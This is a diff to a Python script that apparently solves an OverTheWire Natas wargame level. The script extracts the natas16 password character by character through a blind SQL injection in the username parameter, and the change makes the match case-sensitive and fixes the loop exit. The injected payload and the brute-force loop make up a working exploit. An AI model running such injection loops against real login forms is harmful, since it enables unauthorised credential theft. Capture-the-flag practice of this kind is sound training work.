@@ -97,7 +97,7 @@ while len(bf_passwd) != 32:
     for char in bf_dict:
         r = requests.get(url,
                          params={
-                             'username': 'natas16" AND password LIKE "{}%'.format(bf_passwd + char)
+                             'username': 'natas16" AND password LIKE BINARY "{}%" "'.format(bf_passwd + char)
                          },
                          auth=(http_user, http_pass))
         sys.stdout.write("\rTrying: {} | Password: {}".format(char, bf_passwd))
@@ -106,8 +106,7 @@ while len(bf_passwd) != 32:
             bf_passwd += char
             sys.stdout.write("\rMatch: {} | Password: {}".format(char, bf_passwd))
             sys.stdout.flush()
-            if len(bf_passwd) == 32:
-                break
+            break
 
 print "\rPassword: {}".format(bf_passwd)
 ```
